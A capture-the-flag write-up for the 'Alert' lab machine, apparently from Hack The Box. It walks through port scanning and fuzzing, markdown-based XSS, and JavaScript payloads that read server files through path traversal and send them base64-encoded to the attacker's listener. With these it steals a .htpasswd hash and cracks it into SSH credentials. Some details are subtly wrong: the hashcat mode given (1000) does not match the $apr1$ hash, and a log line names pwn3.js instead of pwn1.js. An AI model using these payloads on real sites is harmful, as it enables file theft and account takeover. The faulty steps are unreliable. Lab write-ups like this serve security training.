# Alert


## Enumeration

???+ Note "Enumeration"

    === ":octicons-codespaces-16: Port Scanning"

        Command to obtain open ports on the target machine.

        ``` bash
        nmap -p- -sS --min-rate 5000 -n -Pn -vvv $HTB_IP -oG allPorts
        ```

        Result

        ``` bash
        # Nmap 7.99SVN scan initiated Fri Apr  3 14:21:05 2026 as: nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.129.231.188
        # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
        Host: 10.129.231.188 () Status: Up
        Host: 10.129.231.188 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 12227/filtered/tcp/////       Ignored State: closed (65532)
        # Nmap done at Fri Apr  3 14:21:21 2026 -- 1 IP address (1 host up) scanned in 15.72 seconds
        ```

        !!! Info 

            In the result we can see two ports open and a filtered

    === ":octicons-code-review-16: Services running"

        Command to obtain the services running on each port

        ``` bash
        nmap -p{ports} -sCV $HTB_IP -oN targeted
        ```

        Result

        ``` bash hl_lines="11-15"
        # Nmap 7.99SVN scan initiated Fri Apr  3 14:44:46 2026 as: nmap -p22,80 -sCV -oN targeted 10.129.231.188
        Nmap scan report for alert.htb (10.129.231.188)
        Host is up (0.24s latency).

        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
        |   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
        |_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        | http-title: Alert - Markdown Viewer
        |_Requested resource was index.php?page=alert
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        # Nmap done at Fri Apr  3 14:45:06 2026 -- 1 IP address (1 host up) scanned in 19.93 seconds
        ```

        !!! Info

            We obtain the services *ssh* (port 22) and **http** (port 80) running, we can proceed analizing the http service on a browser.

## Fuzzing Web

???+ Example "Fuzzing Web"

    === ":octicons-browser-16: Look for directories"

        Looking for directories that may be present

        ``` bash
        ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ \
            -u "http://alert.htb/FUZZ" \
            -ic
        ``` 

        Result 

        ``` bash
        css
        uploads
        messages
        server-status
        ```

        !!! Info

            No one of this shows something interesting.
    
    === ":octicons-browser-16: Look for php files"

        We already see that the webpage is working with **Apache httpd 2.4.41** so we can look for **php** files

        ``` bash
        ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ \
            -u "http://alert.htb/FUZZ" \
            -ic -e .php
        ```

        Result

        ``` bash
        css
        contact.php
        uploads
        index.php
        messages
        messages.php
        server-status
        ```

        !!! Info

            No one of this shows something interesting.

    === ":octicons-browser-16: Look for subdomains"

        Now we can look for subdomains, for that we can use the following command.

        ``` bash
        ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
            -H "http://FUZZ.alert.htb/" \
            -u http://alert.htb
        ```

        Result

        ``` bash
        mail
        bbs
        ns2
        webmail
        ns
        ...
        ```

        !!! Info

            There are many information, we need to filter it!

    === ":octicons-browser-16: Look for subdomains filtering"

        We obatined so many results, so we can filter based on the number of words.

        ``` bash
        ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
            -H "http://FUZZ.alert.htb/" \
            -u http://alert.htb \
            -fw 20
        ```

        Result
        
        ``` bash
        statistics
        ```

        !!! Info

            This subdomain "http://statistics.alert.htb" requires credentials for access it.

## Cross Site Scripting

???+ Danger "Cross Site Scripting"

    === ":octicons-file-code-16: test1.md"

        Based on the webpage we will attemp to execute XSS payloads via markdown. So we begin by creating a markdown file to trigger an alert.

        ``` js
        <!-- XSS with regular tags -->
        <script>
            alert(1)
        </script>
        <img src="x" onerror="alert(1)" />
        ```

        ``` mermaid
        sequenceDiagram
        autonumber
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test1.md"
        ```

        !!! Info

            After sending the file and attempting to view it, we notice that the alert has been triggered, so the webpage is vulnerable to XSS.

    === ":octicons-file-code-16: test2.md"

        Then we will change the script in such a way that it will look for the file **pwn1.js** on an external url, the ip of my computer in this case. 

        ``` js
        <script src="http://10.10.17.244:3000/pwn1.js"></script>
        ```

        For this to work we need to put my computer to listen on port 3000.

        ``` bash
        nc -lvnp 3000
        ```

        ``` mermaid
        sequenceDiagram
        autonumber
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test2.md"
        Alert - 10.129.231.188-->>Hacker - 10.10.17.244: Looks for the file "pwn1.js" from the "10.10.17.244" machine.
        ```

        !!! Info

            Now we obtain the following result on my machine.

            ``` bash
            Listening on 0.0.0.0 3000
            Connection received on 10.129.231.188 43568
            GET /pwn1.js HTTP/1.1
            Host: 10.10.17.244:3000
            Connection: keep-alive
            User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
            Accept: */*
            Referer: http://alert.htb/
            Accept-Encoding: gzip, deflate
            ``` 

    === ":octicons-bug-16: pwn1.js"

        Now we can create the script pwn1.js to get the content of a file, since we know that it works with **Apache httpd 2.4.41** we can look for a configuration file **/etc/apache2/sites-available/000-default.conf**.

        ``` js
        var req = new XMLHttpRequest();
        req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf', false);
        req.send();

        var exfil = new XMLHttpRequest();
        exfil.open('GET', 'http://10.10.17.244:3000/?content=' + btoa(req.responseText), true);
        exfil.send();
        ```

        ``` mermaid
        sequenceDiagram
        autonumber
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test.md"
        Alert - 10.129.231.188-->>Hacker - 10.10.17.244: Looks for the file "pwn1.js"
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "pwn1.js"
        Alert - 10.129.231.188->>Hacker - 10.10.17.244: Returns the file "/etc/apache2/sites-available/000-default.conf"
        ```

        We obtain the following in **base64** encoding.

        ``` bash
        Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
        10.129.231.188 - - [06/May/2026 21:56:47] "GET /pwn3.js HTTP/1.1" 200 -
        10.129.231.188 - - [06/May/2026 21:56:48] "GET /?content=PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg== HTTP/1.1" 200 -
        ```

        We proceed to decode the **base64** data.

        ``` bash linenums="1" hl_lines="35"
        <pre><VirtualHost *:80>
            ServerName alert.htb

            DocumentRoot /var/www/alert.htb

            <Directory /var/www/alert.htb>
                Options FollowSymLinks MultiViews
                AllowOverride All
            </Directory>

            RewriteEngine On
            RewriteCond %{HTTP_HOST} !^alert\.htb$
            RewriteCond %{HTTP_HOST} !^$
            RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

            ErrorLog ${APACHE_LOG_DIR}/error.log
            CustomLog ${APACHE_LOG_DIR}/access.log combined
        </VirtualHost>

        <VirtualHost *:80>
            ServerName statistics.alert.htb

            DocumentRoot /var/www/statistics.alert.htb

            <Directory /var/www/statistics.alert.htb>
                Options FollowSymLinks MultiViews
                AllowOverride All
            </Directory>

            <Directory /var/www/statistics.alert.htb>
                Options Indexes FollowSymLinks MultiViews
                AllowOverride All
                AuthType Basic
                AuthName "Restricted Area"
                AuthUserFile /var/www/statistics.alert.htb/.htpasswd
                Require valid-user
            </Directory>
            ErrorLog ${APACHE_LOG_DIR}/error.log
            CustomLog ${APACHE_LOG_DIR}/access.log combined
        </VirtualHost>

        </pre>
        ```

        !!! Info

            Here we can see the path of an important file that looks interesting `/var/www/statistics.alert.htb/.htpasswd`, so this is the file that we will try to get now.

    === ":octicons-bug-16: pwn2.js"

        We will create the file **pwn2.js** to get the content of the file `/var/www/statistics.alert.htb/.htpasswd`.

        ``` js
        var req = new XMLHttpRequest();
        req.open('GET', 'http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd', false);
        req.send();

        var exfil = new XMLHttpRequest();
        exfil.open('GET', 'http://10.10.17.244:3000/?content=' + btoa(req.responseText), true);
        exfil.send();
        ```

        ``` mermaid
        sequenceDiagram
        autonumber
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test.md"
        Alert - 10.129.231.188-->>Hacker - 10.10.17.244: Looks for the file "pwn2.js"
        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "pwn2.js"
        Alert - 10.129.231.188->>Hacker - 10.10.17.244: Returns the file "/var/www/statistics.alert.htb/.htpasswd"
        ```

        We obtained the following response.

        ``` bash
        Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
        10.129.231.188 - - [06/May/2026 22:17:48] "GET /pwn2.js HTTP/1.1" 200 -
        10.129.231.188 - - [06/May/2026 22:17:49] "GET /?content=PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K HTTP/1.1" 200 -
        ```

        Now we proceed to decode the information that we obtained.

        ``` bash 
        echo -n 'PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K' | base64 -d
        ```

        The result is

        ``` bash
        <pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
        </pre>
        ```

        We can see that the password is hasshed, so we will use *hashcat* to obtain the password in plain text, for that we execute the following command.

        ``` bash
        hashcat hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-75.txt --username -m 1000
        ```

        The result is 
        
        ``` bash
        $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
        ```

        !!! Success

            So we obtained a user and his password

            ``` bash
                User: Albert
                Password: manchesterunited
            ```

            We can try this credentials on `http://statistics.alert.htb`, but since we see *ssh* running on this machine, we can try use this credentials here too, and we will see that it works.










